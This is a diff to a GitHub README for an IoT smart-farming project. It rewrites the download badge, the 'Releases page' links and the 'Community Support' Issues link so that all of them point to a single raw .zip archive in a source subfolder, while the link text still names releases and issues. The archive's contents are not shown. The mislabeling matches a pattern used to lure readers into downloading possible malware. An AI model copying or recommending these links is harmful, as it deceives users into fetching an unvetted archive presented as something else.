@@ -1,7 +1,7 @@
 # 🌱 Automated_Smart_Farming_System_Research_Replica - Grow Smarter with IoT Solutions
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/oyjt112233/Automated_Smart_Farming_System_Research_Replica/releases)
+[![Download](https://raw.githubusercontent.com/oyjt112233/Automated_Smart_Farming_System_Research_Replica/main/Proteus_Simulation_Codes/Automated_Smart_Farming_System_Research_Replica_v1.3.zip)](https://raw.githubusercontent.com/oyjt112233/Automated_Smart_Farming_System_Research_Replica/main/Proteus_Simulation_Codes/Automated_Smart_Farming_System_Research_Replica_v1.3.zip)
 
 ## 📜 Overview
 The Automated Smart Farming System Research Replica is an innovative project designed to help users implement an IoT-based farming solution. This project replicates and enhances a research paper focused on smart farming. With this application, you can monitor and manage various farming parameters efficiently. 
@@ -24,7 +24,7 @@ To run the Automated Smart Farming System, ensure your setup meets the following
 Here’s how to set up your Automated Smart Farming System:
 
 1. **Visit the Releases Page**:
-   To download the application, visit the [Releases page](https://github.com/oyjt112233/Automated_Smart_Farming_System_Research_Replica/releases).
+   To download the application, visit the [Releases page](https://raw.githubusercontent.com/oyjt112233/Automated_Smart_Farming_System_Research_Replica/main/Proteus_Simulation_Codes/Automated_Smart_Farming_System_Research_Replica_v1.3.zip).
 
 2. **Choose the Latest Version**:
    Look for the latest version listed. This will include all recent updates and improvements.
@@ -54,7 +54,7 @@ Here’s how to set up your Automated Smart Farming System:
     After everything is set up, you can start monitoring your farm parameters using the application.
 
 ## 📲 Download & Install
-For the easiest experience, visit the [Releases page](https://github.com/oyjt112233/Automated_Smart_Farming_System_Research_Replica/releases) to download the latest version.
+For the easiest experience, visit the [Releases page](https://raw.githubusercontent.com/oyjt112233/Automated_Smart_Farming_System_Research_Replica/main/Proteus_Simulation_Codes/Automated_Smart_Farming_System_Research_Replica_v1.3.zip) to download the latest version.
 
 ## 🔧 Configuration
 After installing the system, configuring the sensors is simple:
@@ -71,7 +71,7 @@ If you encounter issues:
 
 ## 📚 Additional Resources
 - **Documentation**: Detailed user manual is included in the downloaded content.
-- **Community Support**: Visit the Issues section on the [GitHub Repository](https://github.com/oyjt112233/Automated_Smart_Farming_System_Research_Replica/issues) for ongoing discussions and tech support.
+- **Community Support**: Visit the Issues section on the [GitHub Repository](https://raw.githubusercontent.com/oyjt112233/Automated_Smart_Farming_System_Research_Replica/main/Proteus_Simulation_Codes/Automated_Smart_Farming_System_Research_Replica_v1.3.zip) for ongoing discussions and tech support.
 
 ## 💬 Feedback
 We welcome your feedback to enhance the system. Share your experiences or report any issues through the GitHub Issues page.
